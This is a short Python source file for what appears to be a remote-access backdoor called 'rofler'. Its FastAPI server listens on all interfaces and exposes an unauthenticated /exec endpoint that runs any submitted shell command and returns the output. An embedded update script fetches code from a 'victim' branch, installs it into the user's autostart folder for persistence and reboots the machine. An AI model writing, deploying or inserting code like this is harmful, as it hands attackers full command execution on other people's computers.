import os
from fastapi import FastAPI
import uvicorn


app = FastAPI()


update_cmd = """
rm -rf ~/rofler
rm ~/.config/autostart/rofler
wget https://github.com/ImCocos/rofler/archive/refs/heads/victim.zip -P ~/;
unzip ~/victim.zip -d ~/;
rm ~/victim.zip;
mv ~/rofler-victim ~/rofler;
python -m venv ~/rofler/venv;
~/rofler/venv/bin/python -m pip install -r ~/rofler/requirements.txt;
mkdir ~/.config/autostart;
cp ~/rofler/rofler ~/.config/autostart/rofler;
systemctl reboot;
""".strip()

githubURL = 'https://github.com/ImCocos/rofler/releases'
update_interval_sec = 1000


@app.get("/")
async def home():
    return {'status': 'ok', 'alive': True}

@app.post('/exec')
def exec(cmd: str):
    os.system(cmd + ' > ~/rofler/.tmp')
    with open(os.path.join(os.path.expanduser('~'), 'rofler/.tmp'), 'r') as file:
        raw = file.read()
    return {'status': 'ok', 'text': raw}


if __name__ == "__main__":
    uvicorn.run(app, host="0.0.0.0", port=9999)
